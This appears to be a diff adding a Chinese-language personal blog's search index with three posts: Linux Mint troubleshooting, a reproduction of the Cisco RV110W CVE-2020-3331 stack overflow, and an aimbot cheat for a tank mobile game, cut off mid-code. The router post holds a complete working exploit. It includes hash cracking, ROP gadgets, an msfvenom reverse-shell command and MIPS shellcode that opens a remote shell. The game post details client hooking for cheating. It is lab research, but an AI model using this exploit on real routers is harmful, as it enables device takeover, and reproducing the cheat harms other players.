@@ -1,0 +1,944 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>Linux Mint - Linux 主系统 + Windows 虚拟机双系统方案踩坑</title>
+    <url>/2024/06/01/Linux-Mint-Zephyrus/</url>
+    <content><![CDATA[<h3 id="For-what"><a href="#For-what" class="headerlink" title="For what"></a>For what</h3><p>先说一下为什么我要用 Linux 当主系统。因为最近需要编译一些项目，vm 的性能实在是有点拉了。考虑到以后一直有这方面的需求，干脆决定装一个 Linux 主机 + Windows 虚拟机的工作环境</p>
+<p>然后是为什么要用 Linux Mint 这个系统，而不是 Ubuntu、Kali、Deepin 啥的。原因很简单，我一个一个试的，试了很多发行版(除了 Deepin 没试)。这些系统无一例外都有一些奇怪的 bug，比如 Ubuntu 的死机，我不信邪还装了两次，结果就是用着用着桌面就会卡死，没有任何征兆; Kali 的双屏适配有问题，GPU 驱动适配不了，装着试了但是效果不行，还把图形界面搞炸了。总之最后机缘巧合之下想起来初中的时候用过这个 Linux Mint，然后装着试下了，用着居然还不错。</p>
+<p>我的机子是幻16 2022款，显卡是3060，除了没有 RGB 所有硬件都工作正常</p>
+<h3 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h3><p>简单介绍一下 Linux Mint 这个系统，它是基于 Ubuntu 改的，算是简约派但是该有的基本都有</p>
+<p>桌面用的是他们自己开发的 cinnamon。任务栏上面允许放置小插件(温度监控之类的)，QQ 小图标也可以正常地显示在任务栏中。但是这个桌面有个大槽点是，它开始菜单里左侧可以固定一些快捷应用，但是当你右键这些应用图标，它并不会显示出设置(取消固定之类的)，而是必须在列表里翻到原本的那个应用图标，然后右键才能取消固定。桌面图标有时候会错位，其实问题不大全选拖一下就行了。但是它还有个最严重的问题是，有时候会突然寄掉，然后自己会恢复。虽然它寄掉不会影响正在跑的东西，但是突然出现还是让人心头一紧。寄的原因尚不清楚，可能是爆内存了。开发人员或许知道这个桌面也有美中不足的地方，于是很贴心地在任务栏右键中给了一个疑难解答 debug 模式，可以快速重启桌面。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/mint_taskbar.png"
+                     
+                ></p>
+<p>它自带有软件商店，支持 SystemPackage 和 Flathub，使用体验还是不错的，图片和评论功能都有</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/mint_install.png"
+                     
+                ></p>
+<h3 id="踩坑记录"><a href="#踩坑记录" class="headerlink" title="踩坑记录"></a>踩坑记录</h3><h4 id="Fcitx-5-输入法"><a href="#Fcitx-5-输入法" class="headerlink" title="Fcitx 5 输入法"></a>Fcitx 5 输入法</h4><p>中文输入法要自己装，我用的是 Fcitx5，但是这玩意儿在双屏上有 bug，它可能会获取不到屏幕的 DPI 大小，从而显示出错，打个字出来的候选界面能把占个屏幕占完</p>
+<p><a class="link"   href="https://github.com/fcitx/fcitx5/issues/642" >https://github.com/fcitx/fcitx5/issues/642 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>解决方案：更改 <code>~/.config/fcitx5/conf/classicui.conf</code>，设置 <code>PerScreenDPI=False</code></p>
+<h4 id="N-卡驱动"><a href="#N-卡驱动" class="headerlink" title="N 卡驱动"></a>N 卡驱动</h4><p>你说得对，但是这个系统专门有个页面管理 N 卡驱动，可以在设置里进去</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/mint_gpu.png"
+                     
+                ></p>
+<p>驱动直接装上，一点毛病没有，浏览器都能调用，甚至任务栏小图标还给个显卡图标，可以调模式。但是建议不要调，亲测调成 Intel 节能模式后图形界面启动不了，就用 Nvidia 性能模式就行了</p>
+<p><del>但是比较难受的是，笔记本屏幕怎么搞都只能 60 帧，外接屏能 165 帧没问题。没有外接屏又想装这个系统的要多考虑下了。</del></p>
+<p>更正：更新内核到6.x即可解决显示器帧率问题，GPU模式依旧不建议调，双屏会出现 DPI bug</p>
+<h4 id="QQ-登录"><a href="#QQ-登录" class="headerlink" title="QQ 登录"></a>QQ 登录</h4><p>每次重启系统，QQ 都会给识别成新设备，这个是 QQ 的问题不是系统的问题。QQ 会采集一些指纹来标识机子，比如网卡啥的，在 Linux 下有些东西不像 Windows 那样一成不变，很明显他们搞的采集点有问题，解决方案暂时没有。</p>
+<h4 id="CPU-调度"><a href="#CPU-调度" class="headerlink" title="CPU 调度"></a>CPU 调度</h4><p>在 Linux 下没有奥创中心，CPU 模式调不了，调度疑似是比较激进的，因为风扇经常吹，开个博客网页风扇都一直吹，这点在 Windows 下从未出现过</p>
+<p>可能有人会说直接 <code>/sys/devices</code> 设置啊，Linux 下万物皆可调，但是当我 <code>cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_governor</code>，出来的居然是 “powersave”？？然后我读了下 <code>scaling_driver</code> 这个文件内容是 “intel_pstate”，搜了下原来是一种新的调度技术，它这个 powersave 模式就是兼顾省电和性能的模式。</p>
+<p>但是风扇为什么一直吹呢？我研究了一下，发现居然是 Intel 大小核的问题，计算任务基本上全分给大核了，小核的使用率曲线就如同平静的河面一般毫无波澜。</p>
+<p>执行 <code>uname -a</code> 回显为</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Linux Zephyrus 5.15.0-107-generic #117-Ubuntu SMP Fri Apr 26 12:26:49 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux</span><br></pre></td></tr></table></figure></div>
+
+<p>一开始我以为是这个内核没有针对大小核进行优化，就升级了内核到 6.x，结果歪打正着解决了显示器帧率问题。并且我搜到 Linux Mint 的<a class="link"   href="https://forums.linuxmint.com/viewtopic.php?t=420077" >论坛 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>居然有个人和我问一模一样的问题，电脑配置都和我一样</p>
+<p>然后升级了内核，CPU 温度还是高，于是又继续研究，最终找到了解决方案</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Disable CPU frequence turbo</span></span><br><span class="line"><span class="built_in">echo</span> 1&gt;/sys/devices/system/cpu/intel_pstate/no_turbo</span><br><span class="line"></span><br><span class="line"><span class="comment"># List available CPU power preferences </span></span><br><span class="line"><span class="built_in">cat</span> policy0/energy_performance_available_preferences </span><br><span class="line"><span class="comment"># default performance balance_performance balance_power power </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set CPU power config from &quot;balance_performance&quot; to &quot;balance_power&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;balance_power&quot;</span>|<span class="built_in">tee</span> /sys/devices/system/cpu/cpufreq/policy*/energy_performance_preference</span><br></pre></td></tr></table></figure></div>
+
+<p>这样修改后，CPU 已经基本能压到六十多度，风扇再转基本就是 GPU 驱动的问题了</p>
+<h4 id="科学上网"><a href="#科学上网" class="headerlink" title="科学上网"></a>科学上网</h4><p>科学上网我选择使用 <a class="link"   href="https://github.com/v2rayA/v2rayA" >v2raya <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，使用 web 页面进行管理</p>
+<h4 id="Windows-虚拟机"><a href="#Windows-虚拟机" class="headerlink" title="Windows 虚拟机"></a>Windows 虚拟机</h4><p>一开始用的 Virt-manager，这玩意儿性能不错，但是分辨率不能随意调整，鼠标还是卡，有些细节还是不太行，就换成 VirtualBox 了，使用体验非常好</p>
+]]></content>
+      <categories>
+        <category>技术</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+        <tag>Windows</tag>
+        <tag>TroubleShooting</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Cisco RV110W 路由器 CVE-2020-3331 漏洞复现</title>
+    <url>/2024/03/11/RV110W-CVE-2020-3331/</url>
+    <content><![CDATA[<p>某天发现实验室里有这个路由器，是学长留下的，那这不日日都说不过去了吧</p>
+<p>参考：</p>
+<p><a class="link"   href="https://xuanxuanblingbling.github.io/iot/2020/10/26/rv110w/" >思科路由器 RV110W CVE-2020-3331 漏洞复现 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h3 id="Start"><a href="#Start" class="headerlink" title="Start"></a>Start</h3><p>首先可以拿到该设备的固件，解包固件可以找到 <code>/etc/shadow</code> 里面存的 admin 用户的密码 hash</p>
+<p><code>/sbin/rc</code> :</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/RV110W_rc.png"
+                     
+                ></p>
+<p>使用 hashcat 可以对该 hash 进行爆破，需要事先准备一份弱密码字典，最后爆出来 密码是 <code>Admin123</code> 。有了密码，就能直接通过 telnet 远程连上路由，这样有 shell 比较方便复现漏洞</p>
+<p>搜索 <code>login.cgi</code> 路由，以确定 web 服务器程序是哪一个</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">grep -rn <span class="string">&quot;login.cgi&quot;</span> * 2&gt;/dev/null</span><br><span class="line"><span class="comment"># 递归搜索关键字，并将stderr重定向到null</span></span><br><span class="line"><span class="comment"># &#x27;*&#x27; 表示搜索所有文件</span></span><br><span class="line"><span class="comment"># r 表示递归，n 表示显示行号</span></span><br></pre></td></tr></table></figure></div>
+
+<p>最终确定是 <code>/sbin/httpd</code></p>
+<p>分析 <code>/sbin/httpd</code> 程序中的 <code>guest_logout_cgi()</code> ，发现危险函数 <code>sscanf()</code></p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">v5 = (<span class="type">const</span> <span class="type">char</span> *)get_cgi(<span class="string">&quot;cmac&quot;</span>);</span><br><span class="line">v7 = get_cgi(<span class="string">&quot;cip&quot;</span>);</span><br><span class="line">v6 = (<span class="type">const</span> <span class="type">char</span> *)get_cgi(<span class="string">&quot;cip&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> ( j = (<span class="type">char</span> *)(v7 + <span class="built_in">strlen</span>(v6) - <span class="number">1</span>); get_cgi(<span class="string">&quot;cip&quot;</span>) &lt; (<span class="type">unsigned</span> <span class="type">int</span>)j; *j-- = <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v9 = *j;</span><br><span class="line">  <span class="keyword">if</span> ( v9 != <span class="number">10</span> &amp;&amp; v9 != <span class="number">13</span> &amp;&amp; v9 != <span class="number">32</span> )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">v10 = (<span class="type">const</span> <span class="type">char</span> *)get_cgi(<span class="string">&quot;cip&quot;</span>);</span><br><span class="line">v11 = (<span class="type">const</span> <span class="type">char</span> *)get_cgi(<span class="string">&quot;submit_button&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( !v11 )</span><br><span class="line">  v11 = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> ( v5 &amp;&amp; v10 )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">memset</span>(v29, <span class="number">0</span>, <span class="number">0x40</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(v28, <span class="number">0</span>, <span class="keyword">sizeof</span>(v28));</span><br><span class="line">  v12 = fopen(<span class="string">&quot;/dev/console&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">  v13 = v12;</span><br><span class="line">  <span class="keyword">if</span> ( v12 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(v12, <span class="string">&quot;\n  mac=[%s], ip=[%s], submit_button=[%s]\n&quot;</span>, v5, v10, v11);</span><br><span class="line">    fclose(v13);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( VERIFY_MAC_17(v5) &amp;&amp; VERIFY_IPv4(v10) ) <span class="comment">//MAC 和 IP 有效</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strstr</span>(v11, <span class="string">&quot;status_guestnet.asp&quot;</span>) ) <span class="comment">//submit_button 包含 status_guestnet.asp</span></span><br><span class="line">      <span class="keyword">goto</span> LABEL_31;</span><br><span class="line">    <span class="built_in">sscanf</span>(v11, <span class="string">&quot;%[^;];%*[^=]=%[^\n]&quot;</span>, v29, v28);  </span><br></pre></td></tr></table></figure></div>
+
+<p>这个 <code>sscanf</code> 是在从<code>v11</code>正则匹配存到 <code>v29</code> <code>v28</code> ，存在栈溢出漏洞</p>
+<p>匹配规则：<code>%</code>表示要，<code>%*</code>表示不要</p>
+<ul>
+<li><code>%[^;]</code> 分号前面的所有字符都要，存在 <code>v29</code></li>
+<li><code>;%*[^=]</code> 分号后等号前所有的东西都不要</li>
+<li><code>=%[^\n]</code> 等号后所有东西都要，存在 <code>v28</code></li>
+</ul>
+<p>比如 <code>aaa;bbb=ccc</code> 就是<code>aaa</code>和<code>ccc</code>被提取出</p>
+<p>其实这个匹配不重要，此时 v11 就是 <code>submit_button=</code> 后面的值</p>
+<p>故分析程序路径要到达这个 sscanf 得有三个参数且满足对应的要求：</p>
+<ol>
+<li>cmac：MAC 地址格式</li>
+<li>cip：IP 地址格式</li>
+<li>submit_button: 包含 status_guestnet.asp</li>
+</ol>
+<p>我们可以传输超长的 submit_button 项来测试是否会溢出，另外两个 cmac 和 cip 都有格式检测，唯有 submit_button 只需要包含字符串 <code>status_guest.asp</code> 即可</p>
+<p>可以写一个 python 脚本来发包看看：</p>
+<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://192.168.1.1/guest_logout.cgi&quot;</span></span><br><span class="line">payload = &#123;<span class="string">&quot;cmac&quot;</span>:<span class="string">&quot;12:af:aa:bb:cc:dd&quot;</span>,<span class="string">&quot;submit_button&quot;</span>:<span class="string">&quot;status_guestnet.asp&quot;</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">100</span>,<span class="string">&quot;cip&quot;</span>:<span class="string">&quot;192.168.1.100&quot;</span>&#125;</span><br><span class="line"><span class="comment">#requests.get(url, data=payload, verify=False, timeout=1)</span></span><br><span class="line">requests.post(url, data=payload, verify=<span class="literal">False</span>, timeout=<span class="number">1</span>)</span><br></pre></td></tr></table></figure></div>
+
+<p>post 上去之后，web 页面就无法访问了，为了得到更多的细节，我们可以传一个 gdbserver 上去远程调试</p>
+<p><a class="link"   href="https://gitee.com/h4lo1/HatLab_Tools_Library/tree/master/%E9%9D%99%E6%80%81%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%A8%8B%E5%BA%8F/gdbserver" >https://gitee.com/h4lo1/HatLab_Tools_Library&#x2F;tree&#x2F;master&#x2F;静态编译调试程序&#x2F;gdbserver <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">./gdbserver --attach 0.0.0.0:1234 515 <span class="comment"># httpd pid</span></span><br></pre></td></tr></table></figure></div>
+
+<p>经过调试，执行到 <code>sscanf</code> 时，v29 会匹配到 <code>submit_button</code> 的值，如果后面不加更多参数的话 v28 什么都匹配不到</p>
+<p>v29 正好是该函数栈最底端的数据，紧接 fp 和 pc，那么覆盖 pc 将非常容易</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/RV110W_stack.png"
+                     
+                ></p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; distance 0x7fcc839c 0x7fcc8404</span><br><span class="line">0x7fcc839c-&gt;0x7fcc8404 is 0x68 bytes (0x1a words)</span><br><span class="line"><span class="comment"># len(&quot;status_guestnet.asp&quot;) == 19</span></span><br><span class="line"><span class="comment"># 0x68-19 = 85</span></span><br></pre></td></tr></table></figure></div>
+
+<p>所以填充长度为85</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&quot;status_guestnet.asp&quot;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">85</span>+p32(pc)</span><br></pre></td></tr></table></figure></div>
+
+<p>mips 没有 nx ，所以可以 shellcode in stack</p>
+<p>如下图，函数退出时，这些寄存器都可以自由控制</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/RV110W_ida.png"
+                     
+                ></p>
+<p>首先得找到合适的 gadget, 把栈地址给寄存器，然后再跳到寄存器</p>
+<p>不能使用程序本身的 gadget，因为程序的地址有<code>\x00</code> ，发过去就截断了，所以考虑使用 libc</p>
+<p>经过调试发现 libc 的地址是固定的，并没有随机化，固定为 0x2af98000，可以在 libc 中查找 gadget</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># stackfind 表示查找给寄存器赋栈地址值的 gadget,同时使用 move $t9 过滤跳转寄存器指令</span></span><br><span class="line">ROPgadget --binary libc.so --mipsrop <span class="string">&quot;stackfinder&quot;</span>|grep <span class="string">&#x27;move $t9&#x27;</span></span><br><span class="line"><span class="comment">#0x002CBFC # la      $a0, _stdio_openlist_add_lock ; move    $t9, $s1 ; jalr    $t9 ; addiu   $a0, $sp, 0x28</span></span><br><span class="line"><span class="comment"># 该 gadget 将 sp+0x28 赋给a0，然后跳转到 s1,注意这里向前提了一条是防止地址有\x00</span></span><br><span class="line">ROPgadget --binary libc.so |grep <span class="string">&#x27;move $t9, $a0&#x27;</span></span><br><span class="line"><span class="comment">#0x0003d050 : move $t9, $a0 ; sw $v0, 0x18($sp) ; jalr $t9 ; addiu $a0, $sp, 0x18</span></span><br><span class="line"><span class="comment"># 跳转到栈地址</span></span><br></pre></td></tr></table></figure></div>
+
+<p>至于控制各寄存器的栈偏移位置可以用 <code>cyclic()</code> <code>cyclic_find()</code>测算</p>
+<p>shellcode 的功能是反弹shell，所以开一个端口进行监听，shellcode 可以用<a class="link"   href="http://shell-storm.org/shellcode/files/shellcode-860.php" >这个 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，也可以用 msf 生成，我选择用 msf</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/mipsle/shell_reverse_tcp  LHOST=10.10.10.100 LPORT=31337 --<span class="built_in">arch</span> mipsle --platform linux -f py -o shellcode.py</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> thread,requests</span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>,endian=<span class="string">&#x27;little&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">io     = listen(<span class="number">31337</span>)</span><br><span class="line">libc   = <span class="number">0x2af98000</span></span><br><span class="line"></span><br><span class="line">jmp_s0 = libc + <span class="number">0x002CBFC</span> <span class="comment"># la      $a0, _stdio_openlist_add_lock ; move    $t9, $s1 ; jalr    $t9 ; addiu   $a0, $sp, 0x28</span></span><br><span class="line">jmp_a0 = libc + <span class="number">0x0003D050</span> <span class="comment"># move $t9, $a0 ; sw $v0, 0x18($sp) ; jalr $t9</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">b&quot;\xff\xff\x04\x28\xa6\x0f\x02\x24\x0c\x09\x09\x01\x11\x11\x04\x28&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27\x20\x80\x01&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27\x20\x80\x01&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x27\x28\x80\x01\xff\xff\x06\x28\x57\x10\x02\x24\x0c\x09\x09\x01&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xff\xff\x44\x30\xc9\x0f\x02\x24\x0c\x09\x09\x01\xc9\x0f\x02\x24&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x0c\x09\x09\x01\x79\x69\x05\x3c\x01\xff\xa5\x34\x01\x01\xa5\x20&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xf8\xff\xa5\xaf\x0a\x64\x05\x3c\x0a\x0a\xa5\x34\xfc\xff\xa5\xaf&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xf8\xff\xa5\x23\xef\xff\x0c\x24\x27\x30\x80\x01\x4a\x10\x02\x24&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x0c\x09\x09\x01\x62\x69\x08\x3c\x2f\x2f\x08\x35\xec\xff\xa8\xaf&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x73\x68\x08\x3c\x6e\x2f\x08\x35\xf0\xff\xa8\xaf\xff\xff\x07\x28&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xf4\xff\xa7\xaf\xfc\xff\xa7\xaf\xec\xff\xa4\x23\xec\xff\xa8\x23&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xf8\xff\xa8\xaf\xf8\xff\xa5\x23\xec\xff\xbd\x27\xff\xff\x06\x28&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xab\x0f\x02\x24\x0c\x09\x09\x01&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># offset for s0: 49</span></span><br><span class="line"><span class="comment">#s1: 53</span></span><br><span class="line"><span class="comment">#s2: 57</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;status_guestnet.asp&quot;</span> +<span class="string">b&#x27;a&#x27;</span>*<span class="number">49</span>+p32(jmp_a0)+<span class="number">32</span>*<span class="string">b&#x27;a&#x27;</span>+p32(jmp_s0)+<span class="number">0x28</span>*<span class="string">b&#x27;a&#x27;</span>+shellcode</span><br><span class="line"><span class="comment">#payload += cyclic(100)</span></span><br><span class="line">paramsPost = &#123;<span class="string">&quot;cmac&quot;</span>:<span class="string">&quot;12:af:aa:bb:cc:dd&quot;</span>,<span class="string">&quot;submit_button&quot;</span>:payload,<span class="string">&quot;cip&quot;</span>:<span class="string">&quot;10.10.10.100&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>():</span><br><span class="line">    <span class="keyword">try</span>: requests.post(<span class="string">&quot;https://10.10.10.1/guest_logout.cgi&quot;</span>, data=paramsPost, verify=<span class="literal">False</span>,timeout=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span>: <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">thread.Thread(attack,()).run()</span><br><span class="line">io.wait_for_connection()</span><br><span class="line">log.success(<span class="string">&quot;getshell&quot;</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># reg 0x0431B58</span></span><br><span class="line"><span class="comment">#0x431bb0</span></span><br></pre></td></tr></table></figure></div>
+
+<p><a class="link"   href="https://xuanxuanblingbling.github.io/iot/2020/10/26/rv110w/" >https://xuanxuanblingbling.github.io/iot/2020/10/26/rv110w/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>其实我贴的这个文章中有一个错误，其选择的 libc gadget 0x000257A0 有一个指令为</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sw     $v0, 0x18($sp)</span><br></pre></td></tr></table></figure></div>
+
+<p>而 <code>$sp+0x18</code> 正好是他写 shellcode 的地方，此时 v0 为 0，这个指令会让 shellcode 第一条指令<br><code>slti $a0, $zero, 0xFFFF</code> 变成 <code>nop</code>，导致第一个 syscall：close(stdin) 实际上没有正常执行</p>
+]]></content>
+      <categories>
+        <category>技术</category>
+      </categories>
+      <tags>
+        <tag>IOT</tag>
+        <tag>路由器， Pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>3D 坦克手游自瞄挂开发</title>
+    <url>/2024/04/10/TOHack/</url>
+    <content><![CDATA[<p>3D 坦克是一个多人在线游戏，玩家操作自己的坦克进行杀敌、拔旗、站点等活动，整个游戏偏科幻类型</p>
+<p>某日突然发现其手游的客户端居然没有任何防护，故心血来潮就想试试能不能做出大名鼎鼎的自瞄挂，过程比较曲折，但是结果却有惊喜。</p>
+<h3 id="前置信息介绍"><a href="#前置信息介绍" class="headerlink" title="前置信息介绍"></a>前置信息介绍</h3><p>在该游戏中，所谓的自瞄指的是长时间瞄准类炮塔的锁定功能，而不是仿真坦克游戏那种摆角度。比如有个炮叫火箭炮，在瞄准锁定敌人一定时间后，它可以发射出一长串追踪火箭，伤害非常可观。但是其瞄准锁定的过程往往会因为敌人的走位或者队友的阻挡被中断。其具体效果可以查看<a class="link"   href="https://www.bilibili.com/video/BV1Zs411E7h7/?share_source=copy_web&vd_source=f225f0bc3ad1daf1caa03ae6fde71bfe&t=186" >该视频 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>3分6秒处。</p>
+<p>为了打破这个限制，曾经国外有很多大佬开发过自瞄挂，使该炮的瞄准不会中断，瞄一下就能稳定地发射出火箭。</p>
+<h3 id="寻找关键函数"><a href="#寻找关键函数" class="headerlink" title="寻找关键函数"></a>寻找关键函数</h3><p>因为是 Android 端所以理所当然地使用 Frida 和 Xposed 这两个工具。Frida 进行 debug，然后移植到 Xposed。</p>
+<p>进入游戏，先随便点点。可以很明显地看出来，这个游戏的界面用是 Android 控件，因为有那种很明显的Android 点击动画</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/tohack_store.webp"
+                     
+                ></p>
+<p>使用布局查看工具也能证实这个猜想</p>
+<p>布局查看工具：GKD <a class="link"   href="https://gkd.li/guide/" >https://gkd.li/guide/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>在该应用的高级模式中打开悬浮窗服务，手动保存当前游戏 Activity 快照</p>
+<p>然后在 Web 端查看布局抓取结果：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/tohack_gkd.png"
+                     
+                ></p>
+<p>游戏战斗界面有瞄准 button，抓取得到其 id 为 <code>right_shot_button</code>，随后可以在 jadx 中搜索该关键词</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/tohack_jadx1.png"
+                     
+                ></p>
+<p>定位到相关代码后，进行简单交叉引用查找，可以发现很多调用都是在 alternativa 包里面。已知火箭炮的英文名为 Striker，jadx 中直接搜索，可以发现很多 alternativa 的用例，看来该包大概率是游戏逻辑处理部分</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/tohack_jadx_striker.png"
+                     
+                ></p>
+<p>最终也是经过一番翻找，发现相关的逻辑处理就在 <code>lockTarget</code> 函数中</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">alternativa.tanks.battle.weapons.types.striker.components;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span> <span class="comment">// alternativa.tanks.battle.weapons.aiming.AimingWeapon</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">lockTarget</span><span class="params">(<span class="meta">@NotNull</span> LockResult lockResult, <span class="meta">@Nullable</span> Long l)</span> &#123;</span><br><span class="line">        StrikerTargetingSystem strikerTargetingSystem;</span><br><span class="line">        Intrinsics.checkNotNullParameter(lockResult, <span class="string">&quot;lockResult&quot;</span>);</span><br><span class="line">        <span class="type">GunParamsCalculator</span> <span class="variable">gunParamsCalculator</span> <span class="operator">=</span> <span class="built_in">this</span>.gunParamsCalculator;</span><br><span class="line">        <span class="keyword">if</span> (gunParamsCalculator == <span class="literal">null</span>) &#123;</span><br><span class="line">            Intrinsics.throwUninitializedPropertyAccessException(<span class="string">&quot;gunParamsCalculator&quot;</span>);</span><br><span class="line">            gunParamsCalculator = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">GlobalGunParams</span> <span class="variable">laserParams</span> <span class="operator">=</span> gunParamsCalculator.getLaserParams();</span><br><span class="line">        <span class="type">StrikerTargetingSystem</span> <span class="variable">strikerTargetingSystem2</span> <span class="operator">=</span> <span class="built_in">this</span>.targetingSystem;</span><br><span class="line">        <span class="keyword">if</span> (strikerTargetingSystem2 == <span class="literal">null</span>) &#123;</span><br><span class="line">            Intrinsics.throwUninitializedPropertyAccessException(<span class="string">&quot;targetingSystem&quot;</span>);</span><br><span class="line">            strikerTargetingSystem2 = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        